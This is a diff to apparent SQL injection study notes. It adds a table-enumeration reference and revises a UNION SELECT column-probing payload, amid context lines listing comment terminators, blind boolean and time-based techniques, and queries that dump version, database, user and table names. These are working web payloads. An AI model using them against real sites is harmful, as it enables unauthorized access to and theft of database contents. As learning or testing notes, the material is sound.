@@ -79,6 +79,8 @@ To automate the process, use the following tools
 -     '--SPACE 
 -     '-- - 
 -     ' #
+- find table name from information_schema.tables
+-     https://www.sqlinjection.net/table-names/
 - Blined BOOLEAN SQL INJECTION
 -     SELECT "You are in ..." where id='2' and 'a'='a';
 - Time-Based SQL INJECTION
@@ -89,7 +91,7 @@ To automate the process, use the following tools
 -     username=' UNION SELECT 1,2,group_concat(table_name) from information_schema.tables
 - find the total number of vuln columns
 -     ?id=2' order by n --+
--     ?id=2' union select 1,2,3,4,n-1 --+
+-     ?id=2' union select null,null,'text',null,n-1 --+
 -     ?id=2' union select 1,version(),database(),user() --+
 - return data in blind SQL injection
 -     select substring('RAMAN',1,1)='R'; --> True
